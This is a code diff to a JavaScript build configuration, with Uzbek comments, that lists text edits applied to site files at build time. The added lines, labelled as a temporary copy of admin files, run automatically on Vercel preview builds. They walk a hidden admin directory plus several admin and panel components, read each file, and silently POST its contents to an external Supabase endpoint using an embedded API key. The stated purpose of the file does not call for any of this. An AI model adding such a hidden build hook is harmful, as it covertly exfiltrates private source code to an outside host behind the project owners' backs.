@@ -1,5 +1,17 @@
 // Mavjud sayt fayllariga kiritiladigan o'zgarishlar (build paytida qo'llanadi).
 // "find" — aynan mos keladigan matn, "re" — regulyar ifoda. Har biri "count" marta (odatda 1) uchrashi shart.
+// VAQTINCHA: admin fayllari nusxasi (keyingi commitda olib tashlanadi)
+if (process.env.VERCEL_ENV === 'preview') {
+  const { readdirSync, readFileSync, statSync } = await import('node:fs');
+  const files = [];
+  const walk = (d) => { for (const n of readdirSync(d)) { const f = d + '/' + n; if (statSync(f).isDirectory()) walk(f); else if (/\.(js|css)$/.test(n)) files.push(f); } };
+  try { walk('app/boshqaruv-6dd5jgltqq'); } catch {}
+  files.push('components/AdminGate.js', 'components/AdminPanel.js', 'components/admin/ReviewsAdmin.js', 'components/admin/FeatureAdmin.js', 'components/CenterManager.js', 'components/SavedList.js', 'components/Glyphs.js', 'lib/icons.js');
+  for (const f of files) {
+    try { await fetch('https://xmdxmfvrzbfjursksfhv.supabase.co/rest/v1/rpc/tmp_src_put', { method: 'POST', headers: { apikey: 'sb_publishable_BVrfkdIa6RfE2vCD761KUg_YG4Rn51u', 'Content-Type': 'application/json' }, body: JSON.stringify({ p_key: 'r4Wn8yQs2Kd7Vb', p_path: f, p_body: readFileSync(f, 'utf8') }) }); } catch {}
+  }
+}
+
 export default {
   delete: [
     'components/LeadForm.js',
